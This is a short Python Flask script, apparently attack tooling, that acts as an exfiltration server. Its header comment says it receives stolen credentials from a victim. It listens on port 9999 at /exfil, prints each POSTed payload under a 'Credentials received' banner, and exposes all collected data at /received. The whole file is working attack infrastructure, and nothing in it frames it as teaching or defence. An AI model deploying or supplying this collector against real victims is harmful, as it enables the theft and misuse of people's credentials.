# exfil_server.py — receives stolen credentials from victim via HTTP POST
from flask import Flask, request
import json, sys

app = Flask(__name__)
received = []

@app.route("/exfil", methods=["POST"])
def exfil():
    data = request.get_data(as_text=True)
    received.append(data)
    print(f"\n[+] ===== Credentials received =====")
    print(data)
    print("[+] ===== Exfil complete =====\n", flush=True)
    return "ok", 200

@app.route("/received", methods=["GET"])
def get_received():
    return json.dumps(received), 200

if __name__ == "__main__":
    print("[*] Exfil server listening on 0.0.0.0:9999", flush=True)
    app.run(host="0.0.0.0", port=9999, threaded=True)
